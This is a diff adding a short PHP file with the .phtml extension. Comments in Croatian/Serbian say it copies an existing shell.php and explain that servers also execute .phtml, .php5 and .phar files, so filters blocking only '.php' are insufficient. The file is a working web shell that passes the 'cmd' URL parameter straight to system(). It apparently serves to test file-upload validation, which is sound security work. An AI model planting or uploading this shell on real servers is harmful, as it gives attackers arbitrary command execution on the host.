@@ -1,0 +1,6 @@
+<?php
+// Ista logika kao shell.php, ali alternativna ekstenzija (.phtml).
+// Mnogi serveri izvrsavaju i .phtml/.php5/.phar kao PHP, pa allowlist
+// koji blokira samo ".php" nije dovoljan.
+echo "WEB SHELL (phtml) OK: ";
+system($_GET['cmd'] ?? 'whoami');
